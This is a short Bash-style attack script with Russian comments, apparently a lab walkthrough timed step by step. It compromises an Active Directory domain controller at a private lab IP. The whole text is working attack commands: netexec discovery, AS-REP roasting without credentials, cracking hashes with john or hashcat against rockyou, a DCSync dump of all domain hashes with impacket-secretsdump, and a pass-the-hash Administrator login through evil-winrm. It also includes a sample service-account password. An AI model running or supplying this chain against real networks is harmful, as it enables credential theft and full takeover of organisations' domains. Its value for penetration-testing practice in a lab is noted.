DC=192.168.56.10  # ← замени на IP твоего DC

# === ШАГ 1: Разведка сети (5 мин) ===
netexec smb $DC/24

# === ШАГ 2: AS-REP Roasting — БЕЗ пароля! (10 мин) ===
netexec ldap $DC -u '' -p '' --asreproast asrep.txt

# Смотрим что нашли:
cat asrep.txt

# === ШАГ 3: Взлом хеша (10 мин) ===
# Вариант A — через john:
john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt asrep.txt

# Вариант B — если john не знает формат, через hashcat:
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# Смотрим взломанный пароль:
john --show asrep.txt
# или
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --show

# === ШАГ 4: Проверка групп взломанного юзера (5 мин) ===
netexec smb $DC -u svc_backupagent -p 'Welcome2024!' --groups

# === ШАГ 5: DCSync — получаем все хеши домена (15 мин) ===
impacket-secretsdump svc_backupagent:'Welcome2024!'@$DC

# Ищем строку с Administrator:
# Administrator:500:aad3b435b51404ee...:<NTLM_HASH> ← копируем NTLM хеш

# === ШАГ 6: Заходим как Domain Admin (10 мин) ===
evil-winrm -i $DC -u Administrator -H <ВСТАВЬ_NTLM_ХЕШ_ИЗ_ШАГА_5>

# Проверяем:
whoami /all
net user /domain
